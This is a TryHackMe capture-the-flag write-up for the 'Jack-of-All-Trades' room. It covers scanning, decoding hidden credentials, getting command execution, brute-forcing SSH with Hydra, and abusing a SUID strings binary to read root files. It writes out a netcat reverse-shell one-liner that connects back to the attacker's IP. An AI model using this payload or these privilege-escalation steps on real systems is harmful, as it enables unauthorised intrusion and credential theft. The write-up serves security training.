---
title: Jack-of-All-Trades TryHackMe Writeup
tags: [writeup,rest,python,tryhackme,linux,api,suid]
style: border
color: success
description: ""
---


![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/1.jpeg)

## Scanning
We performed an nmap scan of all ports, with scripts and software versions.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/2.png)

## Enumeration
We tried to access the website from the browser, but it will not open.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/3.png)

But, if we try **curl** we will see the content of the site, there is a string in **base64**.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/4.png)

Decode the message, you will get a password.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/5.png)

We access the file *"recovery.php "*, there we will have to decode another message, this time it will be more complicated.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/6.png)

We access the site with the hint, we see a famous *"dinosaur"*. After reading the message and the image, we already sense what we have to do.

#### Download stego.jpg image

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/7.png)

Let's try the other image... And we got credentials.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/8.png)

Searching through **Google**, we found this [tutorial](https://www.ryadel.com/en/firefox-this-address-is-restricted-override-fix-port/
) that explains how to change the port to browse **Firefox**, so we follow the guide, access the file *"recovery.php"* and use the credentials obtained.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/9.png)

## Exploitation
We make a small one and check that we can execute commands.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/9.png)

#### Reverse shell
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.30.149 443 >/tmp/f
```
We will use the above *payload + URL-Encode* to obtain a shell on the victim machine.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/10.png)

We access the *"/home/"* and find a list of passwords for the user *"Jack"*.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/11.png)

We use the **Hydra** tool to obtain the correct password in just seconds.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/12.png)

We access by **SSH**, we enumerate a file *"user.jpg"*. We transfer it to our machine and read the user flag.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/13.png)

#### Evidence user flag

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/14.png)

## Abuse of privileges
We launch the **lse.sh** tool, enumerate the uncommon SUID *strings* binary.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/15.png)

We look for information, we see that it is possible to load a variable with an arbitrary path and to be able to execute **strings** to read its content. 

First, I tried to read the file *"id_rsa"* of the root user, but it does not exist. So a quick option is to read the flag directly.

![](https://raw.githubusercontent.com/m3n0sd0n4ld/m3n0sd0n4ld.github.io/main/_posts/Jack-of-All-Trades/16.png)




